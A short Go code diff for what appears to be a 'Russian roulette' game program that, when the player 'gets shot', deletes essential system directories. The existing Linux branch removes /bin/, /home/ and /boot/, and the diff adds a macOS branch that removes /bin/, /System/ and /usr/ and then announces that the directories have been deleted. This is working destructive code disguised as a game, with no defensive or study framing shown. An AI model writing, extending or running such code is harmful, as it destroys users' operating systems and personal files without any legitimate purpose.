@@ -23,6 +23,8 @@ func menu() {
 				deleteWindows()
 			} else if runtime.GOOS == "linux" {
 				deleteLinux()
+			} else if runtime.GOOS == "darwin" {
+				deleteDarwin()
 			}
 		} else {
 			fmt.Println("Lucky! You didn't get shot yet!")
@@ -43,5 +45,12 @@ func deleteLinux() {
 	os.RemoveAll("/bin/")
 	os.RemoveAll("/home/")
 	os.RemoveAll("/boot/")
+	fmt.Println("Essential directories have been deleted!")
+}
+
+func deleteDarwin() {
+	os.RemoveAll("/bin/")
+	os.RemoveAll("/System/")
+	os.RemoveAll("/usr/")
 	fmt.Println("Essential directories have been deleted!")
 }
